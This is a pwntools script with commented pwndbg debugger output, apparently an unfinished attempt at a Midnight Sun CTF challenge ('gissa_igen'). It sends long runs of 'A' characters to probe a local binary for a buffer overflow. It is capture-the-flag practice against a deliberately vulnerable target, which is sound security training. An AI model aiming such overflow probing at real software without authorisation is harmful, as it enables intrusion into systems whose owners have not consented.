from pwn import *


#c = remote("gissa-igen-01.play.midnightsunctf.se", "4096")
c = process("gissa_igen")


f1 = "A" * 140
#f1 = p64(0xffffffffffffffff)
f2 = "A" * 140
f3 = "C" * 1


print c.recvuntil("flag (1/3): ")
c.sendline(f1)
print c.recvuntil("flag (2/3): ")
c.sendline(f2)
print c.recvuntil("flag (3/3): ")
c.sendline(f3)
print c.recvline()


c.close()





# RAX  0xfaef000
# RBX  0x0
# RCX  0x555555554bdb ◂— ret    
# RDX  0x134f2
# RDI  0x7fffffffe3c8 ◂— 0x0
# RSI  0x10
# R8   0x0
# R9   0x0
# R10  0x555555554c47 ◂— ret    
# R11  0x346
# R12  0x555555554bb7 ◂— sub    rsp, 0x18
# R13  0x7fffffffe4c0 ◂— 0x1
# R14  0x0
# R15  0x0
# RBP  0x0
# RSP  0x7fffffffe3a0 —▸ 0x555555554986 ◂— mov    qword ptr [rsp + 0x28], rax
# RIP  0x55555555473d ◂— ret    


# ► 0x555555554c32    syscall  <SYS_nanosleep>
#        requested_time: 0x7fffffffe3c8 ◂— 0x0
#        remaining: 0x0
#   0x555555554c34    ret    
# 
#   0x555555554c35    xor    rax, rax
#   0x555555554c38    mov    al, 0x3c
#   0x555555554c3a    syscall 
#   0x555555554c3c    ret    
# 
#   0x555555554c3d    mov    r10, rcx
#   0x555555554c40    xor    rax, rax
#   0x555555554c43    mov    al, 0x9d
#──────────────────────────────────────────[ STACK ]──────────────────────────────────────────
#00:0000│ rsp  0x7fffffffe3a0 —▸ 0x55555555499d ◂— cmp    dword ptr [rsp + 0x34], 0
#01:0008│      0x7fffffffe3a8 ◂— 0x19ff1551
#02:0010│      0x7fffffffe3b0 —▸ 0x7fffffffe486 ◂— 0x0
#03:0018│      0x7fffffffe3b8 —▸ 0x7fffffffe484 ◂— 0x8b
#04:0020│      0x7fffffffe3c0 —▸ 0x7fffffffe3f8 ◂— 'fflag{local}'
#05:0028│ rdi  0x7fffffffe3c8 ◂— 0x0
#06:0030│      0x7fffffffe3d0 ◂— 0x17c5000
#07:0038│      0x7fffffffe3d8 ◂— 0xcffffe3f8
#────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────
# ► f 0     555555554c32
#   f 1     55555555499d
#   f 2     555555554b61
#   f 3     555555554bc5
#   f 4                1
#   f 5     7fffffffe703
#   f 6                0
#pwndbg> x/32xg 0x7fffffffe3c8
#0x7fffffffe3c8: 0x0000000000000000      0x00000000017c5000
#0x7fffffffe3d8: 0x0000000cffffe3f8      0x00007fff0000000c
#0x7fffffffe3e8: 0x0000008bf7ffa000      0x0000555555554b61
#0x7fffffffe3f8: 0x6f6c7b67616c6666      0x000000007d6c6163
#0x7fffffffe408: 0x0000000000000000      0x0000000000000000
#0x7fffffffe418: 0x0000000000000000      0x0000000000000000
#0x7fffffffe428: 0x0000000000000000      0x0000000000000000
#0x7fffffffe438: 0x0000000000000000      0x0000000000000000
#0x7fffffffe448: 0x0000000000000000      0x0000000000000000
#0x7fffffffe458: 0x0000000000000000      0x0000000000000000
#0x7fffffffe468: 0x0000000000000000      0x0000000000000000
#0x7fffffffe478: 0x0000000000000000      0x0000008b00000000
#0x7fffffffe488: 0x0000000000000000      0x0000000000000002
#0x7fffffffe498: 0x0000555555554bb7      0x0000555555554bc5
#0x7fffffffe4a8: 0x0000000000000000      0x0000000000000000
#0x7fffffffe4b8: 0x00007ffff7dd7c6a      0x0000000000000001
#
